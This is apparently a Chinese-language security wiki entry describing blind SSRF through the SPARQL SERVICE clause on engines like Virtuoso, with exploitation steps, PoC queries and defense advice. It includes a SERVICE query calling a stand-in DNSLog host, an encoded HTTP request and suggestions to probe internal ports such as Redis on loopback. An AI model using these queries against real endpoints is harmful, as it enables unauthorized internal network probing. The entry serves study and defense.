---
id: web-generic-ssrf-sparql-service-clause
title: SPARQL SERVICE 子句 SSRF：查询引擎代服务端请求任意 URL
type: scenario
domain: web
path: web/generic/ssrf
technique: sparql-service-clause-ssrf
aliases:
- SPARQL SERVICE SSRF
- Virtuoso SERVICE 远程请求
- 联邦查询 SSRF
- RDF 查询引擎 SSRF
- SPARQL 盲 SSRF
tags:
- web
- ssrf
- sparql
- rdf
- virtuoso
- federation
- blind-ssrf
- dnslog
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V75
  verified_at: '2026-11-05T16:51:03+08:00'
  notes: 已对照图19-21核对；Virtuoso查询编辑器、SERVICE查询与DNSLog 51e469d2命中3.251.120.125记录一致；页面提示Security restrictions，原文主要靠时间差异+DNSLog确认，未展示回显数据；PoC未复跑
---

## 一句话结论

公开的 SPARQL 查询端点若允许 `SERVICE` 关键字，攻击者可在查询中指定任意 IRI，让 RDF 查询引擎（如 Virtuoso）以服务端身份向该地址发起 HTTP 请求，形成盲 SSRF；用 DNSLog 或响应时间即可确认，并可用于探测内网服务。

## 原理

- SPARQL 1.1 的联邦查询通过 `SERVICE <IRI> { pattern }` 把子查询委托给远程 SPARQL 端点：查询引擎会主动向该 IRI 发起 HTTP 请求，取回 RDF 结果并参与本地连接。
- 该特性是协议设计的一部分，不是漏洞；风险来自部署方直接暴露查询端点、未禁用 `SERVICE` 或未限制出站目标。引擎通常以服务进程/容器身份运行，网络可达范围往往大于外部攻击者。
- 攻击者无需控制远程端点：只要 IRI 指向自己控制的域名，就能通过 DNS 解析记录确认请求由目标服务端发出；若指向内网地址，可用请求耗时、错误信息、超时差异判断主机与端口状态。
- 与普通 URL 抓取 SSRF 的差异：入口是结构化查询语句，WAF/参数校验可能只检查 `query` 是否像合法 SPARQL，而不会解析 `SERVICE` 中的 IRI；同时 `SERVICE SILENT` 会吞掉错误，进一步降低可观测性。
- 若引擎支持 `FROM <url>`、`LOAD <url>` 等子句，或允许 `SERVICE` 指向可重定向地址，还可扩展协议与绕过面。

## 触发条件

- 目标暴露 SPARQL 查询接口（常见路径 `/sparql`、`/webapi/rdf/sparql`、`/query` 等），无需强认证或可匿名访问；
- 引擎启用联邦查询，`SERVICE` 未被禁用；
- 服务端允许出站 HTTP/DNS，未限制内网目标；
- 查询超时与错误信息对攻击者可见（或可用 DNSLog 侧信道）。

## 利用步骤

1. 确认查询端点可用：提交 `SELECT * WHERE { ?s ?p ?o } LIMIT 1`，观察是否返回 RDF/JSON/HTML 结果。
2. 申请一个 DNSLog 子域名，构造 `SELECT * WHERE { SERVICE <http://<random>.dnslog.example/> { ?s ?p ?o } }`。
3. 对 `query` 参数做 URL 编码后发送；在 DNSLog 平台查看是否有来自目标出口 IP 的解析记录，确认服务端发起了请求。
4. 将 IRI 换成内网 IP/端口（如 `http://10.0.0.5:8080/`、`http://127.0.0.1:6379/`），根据响应时间、超时与错误差异探测内网服务。
5. 若返回内容包含远程 RDF 数据，可进一步判断目标可访问的内网 HTTP 服务类型；仅在授权范围内验证。
6. 测试时设置查询超时并控制请求频率，避免长查询占用引擎资源。

## PoC

基础查询：

```sparql
SELECT * WHERE { ?s ?p ?o } LIMIT 1
```

SERVICE 盲 SSRF（URL 编码后放入 `query`）：

```sparql
SELECT * WHERE {
  SERVICE <http://<random>.dnslog.example/> {
    ?s ?p ?o
  }
}
```

```http
GET /sparql?query=SELECT%20*%20WHERE%20%7B%20SERVICE%20%3Chttp%3A%2F%2F%3Crandom%3E.dnslog.example%2F%3E%20%7B%20%3Fs%20%3Fp%20%3Fo%20%7D%20%7D&format=text%2Fhtml HTTP/1.1
Host: target.example.com
```

DNSLog 出现目标出口 IP 的解析记录即证明 SSRF；原文通过时间差异确认漏洞存在。

## 变体与关联

- 变体：`SERVICE SILENT <IRI>` 抑制错误，仅剩时间/外带侧信道；`FROM <IRI>`、`LOAD <IRI>`、`INSERT DATA` 等子句在部分引擎中也会触发远程请求。
- 变体：其他 SPARQL 引擎（Fuseki、Blazegraph、GraphDB、Stardog）对 `SERVICE` 的默认策略不同，需按目标确认。
- 关联：[[web-generic-ssrf-connector-imap-website-test-endpoints]]（同文章另一类 SSRF）、[[web-generic-ssrf-configurable-push-url-blind]]（盲 SSRF 的 DNSLog 验证方法）。
- 边界：引擎禁用 `SERVICE`、出站流量被代理/防火墙限制、或查询端点仅对可信网络开放时，不成立。

## 检测与防御

- 检测：`query` 参数中出现 `SERVICE`、`FROM`、`LOAD` 等关键字及外部 IRI；查询耗时异常、DNS 查询指向非常见域名；同一来源批量提交联邦查询。
- 防御：不需要联邦查询时禁用 `SERVICE`（Virtuoso 可通过配置/权限限制），或只允许白名单内的远程端点；对 `query` 做语法解析并拒绝外部 IRI。
- 防御：限制查询引擎的出站网络，禁止访问私网、环回、链路本地与云元数据网段；设置查询超时、结果大小与并发限制。
- 防御：查询端点要求认证与授权，记录完整查询语句、来源 IP 与耗时，异常联邦查询告警。
